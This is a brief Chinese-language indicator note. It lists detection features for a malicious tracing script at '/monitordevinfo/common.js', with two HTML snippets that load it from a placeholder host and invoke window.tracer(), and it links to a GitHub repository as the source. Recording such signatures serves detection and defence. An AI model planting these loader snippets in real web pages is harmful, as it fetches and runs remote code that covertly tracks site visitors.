特征：
```
/monitordevinfo/common.js
```
加载js特征：
```
<script>window.onload=function(){let script=document.createElement("script");script.src="http://xxx/monitordevinfo/common.js";document.body.appendChild(script);script.onload=function(){setTimeout(()=>{window.tracer()},1000)}}</script>
```
```
<script async type="text/javascript" src="http://xxx/monitordevinfo/common.js"></script>
```
来源：

[https://github.com/fuckjsonp/FuckJsonp-RCE-CVE-2022-26809-SQL-XSS-FuckJsonp](https://github.com/fuckjsonp/FuckJsonp-RCE-CVE-2022-26809-SQL-XSS-FuckJsonp)

[https://web.archive.org/web/20220730055436/https://github.com/fuckjsonp/FuckJsonp-RCE-CVE-2022-26809-SQL-XSS-FuckJsonp](https://web.archive.org/web/20220730055436/https://github.com/fuckjsonp/FuckJsonp-RCE-CVE-2022-26809-SQL-XSS-FuckJsonp)
